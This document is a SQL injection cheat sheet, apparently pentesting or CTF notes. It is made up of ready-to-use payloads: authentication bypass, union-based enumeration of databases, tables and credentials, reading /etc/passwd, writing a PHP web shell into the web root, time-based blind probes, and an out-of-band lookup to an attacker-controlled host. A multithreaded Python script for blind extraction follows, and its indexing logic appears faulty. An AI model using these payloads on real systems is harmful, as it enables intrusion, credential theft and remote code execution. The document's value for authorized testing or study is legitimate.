## SQL Injection

### Payload SQL injection

| **Payload**                                                                                                                                | **Description**                                      |
| ------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------- |
| **Auth Bypass**                                                                                                                            |
| `admin' or '1'='1`                                                                                                                         | Basic Auth Bypass                                    |
| `admin')-- -`                                                                                                                              | Basic Auth Bypass With comments                      |
| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)              |
| **Union Injection**                                                                                                                        |
| `' order by 1-- -`                                                                                                                         | Detect number of columns using `order by`            |
| `cn' UNION select 1,2,3-- -`                                                                                                               | Detect number of columns using Union injection       |
| `cn' UNION select 1,@@version,3,4-- -`                                                                                                     | Basic Union injection                                |
| `UNION select username, 2, 3, 4 from passwords-- -`                                                                                        | Union injection for 4 columns                        |
| **DB Enumeration**                                                                                                                         |
| `SELECT @@version`                                                                                                                         | Fingerprint MySQL with query output                  |
| `SELECT SLEEP(5)`                                                                                                                          | Fingerprint MySQL with no output                     |
| `cn' UNION select 1,database(),2,3-- -`                                                                                                    | Current database name                                |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`                                                                  | List all databases                                   |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`                                 | List all tables in a specific database               |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`                | List all columns in a specific table                 |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -`                                                                       | Dump data from a table in another database           |
| **Privileges**                                                                                                                             |
| `cn' UNION SELECT 1, user(), 3, 4-- -`                                                                                                     | Find current user                                    |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`                                                               | Find if user has admin privileges                    |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -`                  | Find if all user privileges                          |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
| **File Injection**                                                                                                                         |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`                                                                                   | Read local file                                      |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`                                                               | Write a string to a local file                       |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`                                  | Write a web shell into the base web directory        |
| `' XOR(if(now()=sysdate(),sleep(5),0))XOR'`                                                                                                | Timebase                                             |
| `0'XOR(if(now()=sysdate(),sleep(1),0))XOR'Z => 1.927`                                                                                      | Timebase                                             |
| `' copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`                                                                     | lookup to attacker server                            |

### Blind injection Enumeration

```python
import string
import requests
import threading

possible = string.ascii_letters + string.digits + "{}_" + string.punctuation
host = 'HOST'
headers = {
    "Content-Type": "application/json"
}
THREADS = 50
FILTER_RESPONSE = "wrong!"

flag = ['' for _ in range(THREADS)]

def exp(index):
    for char in possible:
        print("Trying: ", char, end="\r")
        payload = f"(case when substr((select tbl_name from sqlite_master where tbl_name like 'flag%'),{len(flag)+1},1)='{char}' then '1' else NULL end)"

        body = {
            'submissionID': 1,
            'pagination': payload
        }

        res = requests.post(host, json=body, headers=headers)
        if FILTER_RESPONSE not in res.text:
            print(f"Found: {char} - index: {index}")
            flag[index] = char
            return

if __name__ == '__main__':
    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=exp, args=(i,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    print(''.join(flag))
```
